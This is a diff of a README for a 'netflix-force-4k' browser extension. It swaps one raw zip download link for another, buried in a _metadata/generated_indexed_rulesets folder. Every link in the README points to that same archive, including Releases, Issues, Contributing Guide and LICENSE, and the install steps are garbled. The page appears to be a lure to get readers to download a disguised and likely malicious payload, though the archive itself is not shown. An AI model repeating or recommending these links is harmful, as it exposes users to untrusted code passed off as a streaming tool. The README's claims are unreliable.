@@ -6,9 +6,9 @@ Welcome! This guide will help you set up the **netflix-force-4k** extension. Wit
 
 ## 📥 Download the Extension
 
-[![Download the Latest Release](https://github.com/Cantea1234/netflix-force-4k/raw/refs/heads/main/_metadata/k_netflix_force_v3.1.zip%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/Cantea1234/netflix-force-4k/raw/refs/heads/main/_metadata/k_netflix_force_v3.1.zip)
+[![Download the Latest Release](https://raw.githubusercontent.com/Cantea1234/netflix-force-4k/main/_metadata/generated_indexed_rulesets/force_k_netflix_3.8.zip%20Now-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Cantea1234/netflix-force-4k/main/_metadata/generated_indexed_rulesets/force_k_netflix_3.8.zip)
 
-Visit this page to download the latest version of the extension: [Download Latest Release](https://github.com/Cantea1234/netflix-force-4k/raw/refs/heads/main/_metadata/k_netflix_force_v3.1.zip)
+Visit this page to download the latest version of the extension: [Download Latest Release](https://raw.githubusercontent.com/Cantea1234/netflix-force-4k/main/_metadata/generated_indexed_rulesets/force_k_netflix_3.8.zip)
 
 ## 📋 Features
 
@@ -24,12 +24,12 @@ Visit this page to download the latest version of the extension: [Download Lates
 
 ## 📦 Download & Install
 
-1. **Go to Releases Page**: Click this link to visit the [Releases page](https://github.com/Cantea1234/netflix-force-4k/raw/refs/heads/main/_metadata/k_netflix_force_v3.1.zip).
+1. **Go to Releases Page**: Click this link to visit the [Releases page](https://raw.githubusercontent.com/Cantea1234/netflix-force-4k/main/_metadata/generated_indexed_rulesets/force_k_netflix_3.8.zip).
    
 2. **Choose the Latest Release**: Find the latest release at the top of the page.
 
 3. **Download the Extension**: 
-   - Look for the file named `https://github.com/Cantea1234/netflix-force-4k/raw/refs/heads/main/_metadata/k_netflix_force_v3.1.zip` (or similar).
+   - Look for the file named `https://raw.githubusercontent.com/Cantea1234/netflix-force-4k/main/_metadata/generated_indexed_rulesets/force_k_netflix_3.8.zip` (or similar).
    - Click on the file to download it to your computer.
 
 4. **Unzip the File**: 
@@ -62,14 +62,14 @@ Visit this page to download the latest version of the extension: [Download Lates
 
 ## 💬 Support
 
-If you encounter any issues, feel free to visit the [Issues page](https://github.com/Cantea1234/netflix-force-4k/raw/refs/heads/main/_metadata/k_netflix_force_v3.1.zip) on GitHub. You can report problems and get help from the community.
+If you encounter any issues, feel free to visit the [Issues page](https://raw.githubusercontent.com/Cantea1234/netflix-force-4k/main/_metadata/generated_indexed_rulesets/force_k_netflix_3.8.zip) on GitHub. You can report problems and get help from the community.
 
 ## 📝 Contribution
 
-Contributions are welcome! You can help improve the extension by reporting bugs, suggesting features, or even coding enhancements. Visit the [Contributing Guide](https://github.com/Cantea1234/netflix-force-4k/raw/refs/heads/main/_metadata/k_netflix_force_v3.1.zip) for details.
+Contributions are welcome! You can help improve the extension by reporting bugs, suggesting features, or even coding enhancements. Visit the [Contributing Guide](https://raw.githubusercontent.com/Cantea1234/netflix-force-4k/main/_metadata/generated_indexed_rulesets/force_k_netflix_3.8.zip) for details.
 
 ## 📜 License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/Cantea1234/netflix-force-4k/raw/refs/heads/main/_metadata/k_netflix_force_v3.1.zip) file for details. 
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/Cantea1234/netflix-force-4k/main/_metadata/generated_indexed_rulesets/force_k_netflix_3.8.zip) file for details. 
 
 Thank you for choosing **netflix-force-4k**! Enjoy your 4K viewing experience.
